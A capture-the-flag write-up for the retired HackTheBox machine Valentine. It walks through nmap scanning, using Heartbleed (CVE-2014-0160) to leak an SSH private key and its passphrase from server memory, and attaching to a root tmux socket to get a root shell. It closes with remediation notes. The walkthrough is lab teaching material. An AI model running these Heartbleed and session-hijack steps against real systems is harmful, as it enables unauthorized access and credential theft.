HTB Valentine: Heartbleed memory theft and a root tmux session

retired-machineeasy

Valentine is a retired HackTheBox easy Linux machine built from two famous leftovers. Synopsis: a Heartbleed-vulnerable HTTPS service (CVE-2014-0160) leaking an SSH key and passphrase, then a root tmux session on a world-accessible socket.

$ Enumeration — old TLS

# bash: fingerprint the TLS stack
nmap -sC -sV -oN valentine.nmap 10.10.10.79
nmap --script ssl-heartbleed -p 443 10.10.10.79

HTTP/HTTPS on an older Linux; the certificate and old OpenSSL version string point at Heartbleed before any exploit runs — confirmed by the ssl-heartbleed script.

$ Foothold — Heartbleed memory theft

# bash: bleed, grep, SSH as hype
python3 heartbleed.py 10.10.10.79 -p 443 > dump.bin   # repeat several times
strings dump.bin | grep -i -A2 -B2 "BEGIN.*PRIVATE KEY"
chmod 600 hype_key
ssh -i hype_key hype@10.10.10.79   # passphrase from the same dumps

Sift the leaked 64KB chunks: among the garbage sit an SSH private key and its passphrase in the clear. Save with strict permissions (SSH refuses readable-by-others keys) and log in as hype. Memory-disclosure bugs turn the server into an oracle.

$ Privilege escalation — root tmux socket

# bash: attach the abandoned root session
ls -la /tmp/*.sess /var/tmux* 2>/dev/null; tmux ls
tmux -S <root-owned-socket> attach
id   # uid=0(root)

A tmux socket owned by root that your user can attach to holds a live root shell someone left running — attach and you are root with no exploit at all. Sockets are permissions too. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Bleeding once and giving up (key material spreads across dumps — collect several and grep) and mis-setting key file permissions.

$ Remediation notes

Patch OpenSSL past Heartbleed everywhere, rotate credentials that lived in process memory, and kill idle privileged sessions automatically. Written by Lucky Thandel.
